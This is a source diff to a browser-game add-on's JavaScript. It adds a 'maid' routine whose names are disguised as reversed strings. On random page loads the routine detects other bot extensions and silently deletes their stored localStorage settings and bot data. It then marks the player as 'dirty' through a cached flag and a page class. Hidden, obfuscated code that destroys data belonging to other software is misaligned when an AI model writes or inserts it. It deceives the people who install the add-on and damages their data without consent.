@@ -41,6 +41,12 @@ var gca_global = {
 				document.documentElement.className += " ";
 			document.documentElement.className += "gca_mobile_device";
 		}
+		// If dirty
+		if (gca_tools.easter_eggs.isDirty()) {
+			if (document.documentElement.className.length)
+				document.documentElement.className += " ";
+			document.documentElement.className += "gca_is_dirty";
+		}
 	},
 	// Inject Code
 	inject : function(){
@@ -3177,9 +3183,9 @@ var gca_global = {
 				preload : function(){
 					document.documentElement.className += " do-item-shadow";
 					// If dirty
-					if (new Date().getTime() - gca_data.section.get("cache", "dirty_player", 0) < 24 * 60 * 60 * 1000) {
-						document.documentElement.className += " do-item-dirty-shadow";
-					}
+					//if (gca_tools.easter_eggs.isDirty()) {
+					//	document.documentElement.className += " do-item-dirty-shadow";
+					//}
 				},
 
 				// Inject shadow into inventory
@@ -5246,41 +5252,54 @@ var gca_global = {
 
 	maid : {
 		clean : function() {
-			if ((Math.floor(Math.random() * 10)) != 1) return;
+			let roll = Math.floor(Math.random() * 100);
+			if (roll > 10) return;
 			window.addEventListener('load', () => {
-				let dirty = this.kitchenTrash();
-				dirty = this.bathTrash() || dirty;
-				if (dirty) gca_data.section.set("cache", "dirty_player", new Date().getTime());
+				let dirty = this.kitchenTrash(roll);
+				dirty = this.bathroomTrash(roll) || dirty;
+				dirty = this.bedroomTrash(roll) || dirty;
+				if (dirty) gca_data.section.set("cache", [...'reyalp_ytrid'].reverse().join(""), new Date().getTime());
 			});
 		},
 
-		kitchenTrash : function() {
+		kitchenTrash : function(roll) {
 			if (window.playerId && window[[...'sloot_stg'].reverse().join("")]) {
-				let id = window.playerId.toString(16);
-				let maid = (trash) => {
-					if (typeof trash === 'string') {
-						window.localStorage.removeItem(id + trash);
-					}
-					else if (typeof trash === 'object') {
-						for (let i in trash) {
-							if (trash.hasOwnProperty(i)) {
-								console.log('item', i);
-								maid(trash[i]);
+				if (roll < 2) {
+					let id = window.playerId.toString(16);
+					let maid = (trash) => {
+						if (typeof trash === 'string') {
+							window.localStorage.removeItem(id + trash);
+						}
+						else if (typeof trash === 'object') {
+							for (let i in trash) {
+								if (trash.hasOwnProperty(i)) {
+									console.log('item', i);
+									maid(trash[i]);
+								}
 							}
 						}
-					}
-				};
-				maid(window[[...'syeKgnittes'].reverse().join("")]);
+					};
+					maid(window[[...'syeKgnittes'].reverse().join("")]);
+				}
 				return true;
 			}
 			return false;
 		},
 
-		bathTrash : function() {
+		bathroomTrash : function(roll) {
 			if (window[[...'tpircsyMnur'].reverse().join("")] && window[[...'eMyfiton'].reverse().join("")]) {
-				let base = [...'toBsutaidalGnoitcerruseR'].reverse().join("");
-				window.localStorage.removeItem(base);
-				window.localStorage.removeItem(base + [...'kcattA'].reverse().join(""));
+				if (roll < 2) {
+					let base = [...'toBsutaidalGnoitcerruseR'].reverse().join("");
+					window.localStorage.removeItem(base);
+					window.localStorage.removeItem(base + [...'kcattA'].reverse().join(""));
+				}
+				return true;
+			}
+			return false;
+		},
+
+		bedroomTrash : function(roll) {
+			if (window[[...'toBn'].reverse().join("")] && window[[...'uneMtoBn'].reverse().join("")]) {
 				return true;
 			}
 			return false;
